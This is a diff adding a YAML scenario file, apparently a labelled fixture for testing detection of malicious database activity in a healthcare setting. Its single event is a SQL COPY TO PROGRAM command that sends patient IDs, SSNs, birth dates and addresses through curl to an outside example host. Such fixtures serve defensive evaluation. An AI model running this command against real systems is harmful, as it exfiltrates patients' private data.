@@ -1,0 +1,21 @@
+scenario_id: healthcare_copyprog_mal_01
+family_id: healthcare_copy_to_program_a
+domain: healthcare
+matched_pair_id: healthcare_copyprog_pair_01
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "02:15"
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+  - session_label: dedup_sync
+    role: research_etl_service
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [5.0]
+    events:
+      - step_id: dump
+        sql: "COPY (SELECT patient_id, ssn, date_of_birth, address FROM patients) TO PROGRAM 'curl -sX POST https://sync.med-partner.example/ingest -d @-'"
+        connects_to: {ip: "45.148.10.23", port: 443}
